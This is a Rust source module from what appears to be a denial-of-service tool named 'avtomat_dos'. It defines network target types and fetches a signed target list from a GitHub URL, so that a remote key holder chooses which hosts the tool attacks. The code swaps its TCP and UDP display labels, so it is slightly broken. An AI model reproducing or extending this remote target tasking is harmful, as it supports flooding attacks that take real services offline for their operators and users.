use ed25519_dalek::{PublicKey, Signature, Verifier};
use serde::Deserialize;
use std::collections::hash_map::DefaultHasher;
use std::fmt;
use std::fmt::Formatter;
use std::hash::{Hash, Hasher};
use std::net::IpAddr;

/// A target to send requests to
#[derive(Hash, Debug, Deserialize, Clone)]
#[serde(tag = "type")]
pub enum Target {
    Https { url: String },
    Http { url: String },
    Udp { ip: IpAddr, port: u16 },
    Tcp { ip: IpAddr, port: u16 },
}

impl fmt::Display for Target {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        match self {
            Target::Https { url } => {
                write!(f, "HTTPS://{url}")
            }
            Target::Http { url } => {
                write!(f, "HTTP://{url}")
            }
            Target::Udp { ip, port } => {
                write!(f, "TCP {ip}:{port}")
            }
            Target::Tcp { ip, port } => {
                write!(f, "UDP {ip}:{port}")
            }
        }
    }
}

/// Hash function for targets so they can be put in a hash map
pub fn hash_target<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

/// A signed list of targets
#[derive(Deserialize, Default, Debug)]
struct TargetList {
    targets: Vec<Target>,
}

/// Pub key
const PUB_KEY: [u8; 32] = [
    175u8, 122, 101, 167, 227, 211, 145, 175, 186, 251, 60, 138, 117, 194, 137, 27, 127, 86, 132,
    80, 124, 132, 142, 236, 76, 151, 163, 95, 16, 140, 152, 30,
];

/// Download a file of targets from the server
pub async fn fetch_targets() -> Option<Vec<Target>> {
    // Fetch the list from the server
    let res = match reqwest::get(
        "https://raw.githubusercontent.com/Grrwahrr/avtomat_dos/master/targets.bin",
    )
    .await
    {
        Err(e) => {
            println!("Function fetch_targets() could not get file: {e}");
            return None;
        }
        Ok(res) => res,
    };

    res.bytes()
        .await
        .ok()
        .and_then(|bytes| {
            let sig = bytes.slice(0..64);
            let data = bytes.slice(64..);
            let signature = Signature::from_bytes(&sig).ok()?;
            let public_key = PublicKey::from_bytes(&PUB_KEY).ok()?;

            // Verify the signature
            if let Err(e) = public_key.verify(&data, &signature) {
                println!("Function fetch_targets() could not verify signature: {e:?}");
                return None;
            }

            // Deserialize the data
            match serde_json::from_slice::<TargetList>(&data) {
                Ok(tl) => Some(tl),
                Err(e) => {
                    println!("Function fetch_targets() could not deserialize target list: {e:?}");
                    None
                }
            }
        })
        .map(|opt| opt.targets)
}
